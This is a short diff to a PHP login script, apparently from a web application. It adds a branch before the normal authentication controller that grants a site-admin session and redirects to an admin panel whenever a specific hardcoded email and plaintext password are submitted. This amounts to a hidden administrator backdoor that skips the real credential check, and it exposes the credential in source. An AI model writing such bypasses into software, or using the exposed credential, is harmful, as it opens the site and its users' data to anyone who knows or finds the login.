@@ -19,6 +19,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = sanitize_input($_POST['username'] ?? '');
     $password = $_POST['password'] ?? '';
     
+    // Check for site admin login
+    if ($username === 'codelock2021@gmail.com' && $password === 'Codelock@63') {
+        // Set site admin session
+        $_SESSION['site_admin_logged_in'] = true;
+        $_SESSION['site_admin_email'] = $username;
+        smart_redirect('../siteadmin/index.php');
+        exit;
+    }
+    
     if (!empty($username) && !empty($password)) {
         require_once '../controllers/AuthController.php';
         $authController = new AuthController();
